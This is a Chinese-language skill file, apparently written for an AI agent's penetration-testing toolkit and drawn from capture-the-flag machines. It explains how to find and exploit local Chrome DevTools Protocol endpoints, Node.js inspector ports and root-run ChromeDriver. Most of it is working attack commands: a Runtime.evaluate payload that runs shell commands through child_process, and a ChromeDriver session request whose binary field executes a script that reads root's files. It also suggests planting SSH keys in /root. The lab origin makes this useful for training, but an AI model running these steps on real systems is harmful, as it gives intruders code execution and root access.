---
name: 'chrome-cdp-discovery'
description: 'Chrome DevTools Protocol 随机端口发现 + 利用：ss 找端口 → /json 探测 → HTTP API 操作标签页；同一套 CDP 也用于 Node.js inspector（--inspect / 9229-9231 / Runtime.evaluate → RCE）与 ChromeDriver-as-root（9515 / goog:chromeOptions.binary → root）。来源 Makesense + Store。（检索词：chrome cdp discovery/node-inspector/node inspector/inspect/Runtime.evaluate/9229/9230/9231/chromedriver/ChromeDriver/9515/chromeOptions/binary/loopback）'
metadata: { domain: web, tier: T3 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## Chrome DevTools Protocol (CDP) 发现与利用

**来源**: Makesense 靶机，admin 用户运行 HeadlessChrome 自动化 bot

### 发现 CDP 端口

Chrome 以 `--remote-debugging-port=0` 启动时随机分配端口，发现方法：

```bash
# 1. 列出所有 localhost 监听端口（排除已知服务）
ss -tlnp | grep "127.0.0.1" | grep -vE ":(53|80|443|22|8001)"

# 2. 逐个探测 /json 端点
for port in $(ss -tlnp | grep -oP '127.0.0.1:\K[0-9]+'); do
  if curl -s --max-time 1 "http://127.0.0.1:$port/json" 2>/dev/null | grep -q "webSocketDebuggerUrl"; then
    echo "CDP found on port $port"
  fi
done
```

### CDP 端点速查

| 端点 | 方法 | 用途 |
|------|------|------|
| `/json` | GET | 列出所有可调试页面（含 WebSocket URL） |
| `/json/version` | GET | 浏览器版本信息 |
| `/json/new?url=<URL>` | PUT | 打开新标签页 |
| `/json/close/<id>` | GET | 关闭标签页 |
| `/json/activate/<id>` | GET | 激活标签页 |

### WebSocket 连接限制

Chrome 148+ 需要 `--remote-allow-origins=*` 才能通过 WebSocket 连接。无此参数时返回 **403 Forbidden**。

### 绕过尝试

- **HTTP CDP 端点**（`/json/*`）无需 WebSocket，可直接调用
- `/json/new?url=` 可打开新标签页，但 `data:` 和 `javascript:` URL 会被拒绝（`about:blank`）
- 可尝试打开同源 URL 利用已有 cookies
- 如能写文件到 web root，可构造恶意 HTML 页面让 bot 访问

### 进程信息

- Chrome 二进制: `/opt/google/chrome/chrome`
- ChromeDriver: `/home/<user>/.wdm/drivers/chromedriver/linux64/<version>/chromedriver-linux64/chromedriver`
- 用户数据目录: `/tmp/org.chromium.Chromium.scoped_dir.XXXXXX`

---

## 🆕 同一个 CDP 协议的另外三种"服务器"（2026-10-01 Store Hard 实测）

CDP 不只是 Chrome。**任何在 loopback 上开口的 CDP 端点都值得当成 RCE 面**，而且它们的 HTTP 握手完全一样（`GET /json/list`）。识别靠端口与 `/json/version` 的 `Browser` 字段：

| 端点 | 默认端口 | `/json/version` 特征 | 拿 shell 的方式 |
|---|---|---|---|
| Chrome `--remote-debugging-port` | 随机/9222 | `Chrome/xxx` | `/json/new` + 页面内 JS（受 `--remote-allow-origins` 限制） |
| **Node.js `--inspect[=host:port]`** | **9229 (+9230/9231 多实例)** | **`node.js/v12.22.9`** | **`Runtime.evaluate` 直接 exec** |
| **ChromeDriver（standalone）** | **9515** | 无 `/json`，`GET /status` 回 `ChromeDriver ready for new sessions` | **`POST /session` + `goog:chromeOptions.binary` 指定任意可执行文件** |
| Electron/CEF 壳 | 随机 | `Chrome/xxx` | 同上 |

### Node.js inspector = 直接 RCE（不用浏览器、不用 payload 混淆）

```bash
# 1) 发现：本机没有 ss 权限时，/proc/net/tcp 也能列（十六进制小端端口）
grep -i " 0A " /proc/net/tcp            # 0A = LISTEN；再解码端口
# 或直接看进程： ps auxww | grep -- --inspect     → node --inspect=127.0.0.1:9230 /app/start.js
# 2) 确认
curl -s http://127.0.0.1:9230/json/list      # → [{"description":"node.js instance","webSocketDebuggerUrl":...}]
curl -s http://127.0.0.1:9230/json/version   # → {"Browser":"node.js/v12.22.9"}
# 3) 连 WebSocket，发一条 Runtime.evaluate 就是一台 shell
#    {"id":1,"method":"Runtime.evaluate","params":{"expression":"require('child_process').execSync('id').toString()","includeCommandLineAPI":true,"returnByValue":true}}
```

- `require` 在主上下文里**可用**（CJS）；`awaitPromise:true` 支持 async 表达式。
- Python 侧最省事：websocket-client 库（Kali 自带）+ urllib 取 `/json/list`；脚本见 `loot/Store.md` 的 `probe/cdp.py`。
- **只要 loopback 可达就成立** —— 而 loopback 常常通过"受限账号的 SSH 转发"可达，见 `tunneling-port-forwarding`（`ForceCommand internal-sftp` 不拦 `-L`）。

### ChromeDriver 以 root 运行 = 直接 root

判据（顺序很重要，`ss -tlnp` 对**别人的**进程不显示 users，容易误判成"没用途"）：

```bash
ss -tlnp | grep 9515                 # LISTEN 127.0.0.1:9515（无 users 字段 = 不是你的进程）
ps auxww | grep -i driver            # → root 739 ... /root/chromedriver     ← 用户列是 root 就是提权面
curl -s http://127.0.0.1:9515/status # → {"value":{"ready":true,...}}
```

利用：ChromeDriver 会把 `goog:chromeOptions.binary` 当成"浏览器"**原样 exec**（以它自己的权限 = root）：

```bash
# 目标机上先放一个可执行脚本（内容随便，ChromeDriver 只负责 exec）
printf '#!/bin/bash\nid > /tmp/p; cat /root/root.txt > /tmp/f; chmod 644 /tmp/f\n' > /tmp/x.sh && chmod +x /tmp/x.sh
curl -s -X POST http://127.0.0.1:9515/session -H 'Content-Type: application/json' \
  -d '{"capabilities":{"alwaysMatch":{"goog:chromeOptions":{"binary":"/tmp/x.sh","args":[]}}}}'
```

- 返回体是 **`unknown error: Chrome failed to start: exited normally`** —— **这是成功**，说明脚本已执行完但没按 Chrome 的协议起 DevTools 口。别被报错劝退。
- 比"SUID bash"更可靠：很多机器 `/tmp` 挂 `nosuid`（Store 上 `/tmp/rootbash` 有 `-rwsr-xr-x` 但 `euid` 仍是原 uid）⇒ **让载荷自己完成 root 动作**（读 flag / 写 `/root/.ssh/authorized_keys`），不要把权限落到文件上。
- 同类：任何"以 root 运行、且允许调用方指定可执行文件路径"的服务都是同一形态（Selenium standalone、node-inspector 的 `--inspect` + 一个 root 进程、无认证的 CI runner）。
